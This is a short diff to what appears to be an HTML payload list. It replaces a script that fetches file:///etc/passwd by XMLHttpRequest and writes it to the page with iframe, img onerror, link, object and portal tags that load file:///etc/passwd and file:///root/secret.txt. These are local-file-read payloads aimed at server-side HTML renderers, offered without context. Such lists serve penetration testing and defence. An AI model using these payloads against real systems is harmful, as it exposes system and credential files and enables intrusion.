@@ -1,7 +1,5 @@
-<script>
-    xhzeem = new XMLHttpRequest();
-    xhzeem.onload = function(){document.write(this.responseText);}
-    xhzeem.onerror = function(){document.write('failed!')}
-    xhzeem.open("GET","file:///etc/passwd");
-    xhzeem.send();
-</script>
+<iframe src=file:///etc/passwd></iframe>
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<link rel=attachment href="file:///root/secret.txt">
+<object data="file:///etc/passwd">
+<portal src="file:///etc/passwd" id=portal>
